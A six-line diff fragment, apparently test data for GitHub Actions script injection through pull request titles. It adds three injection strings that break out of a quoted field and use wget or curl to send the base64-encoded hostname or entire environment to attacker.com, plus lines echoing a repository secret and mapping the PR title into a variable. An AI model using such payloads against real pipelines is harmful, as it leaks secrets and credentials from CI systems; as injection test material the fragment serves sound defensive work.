@@ -1,0 +1,6 @@
+"; wget -q -O- attacker.com/$(cat /etc/hostname | base64) #
+test"; curl https://attacker.com/$(env | base64 -w0) #
+"; curl -s attacker.com/$(cat /etc/hostname | base64 -w0 | head -c 40) #
+echo "${{ secrets.API_KEY }}"
+env:
+  PR_TITLE: ${{ github.event.pull_request.title }}
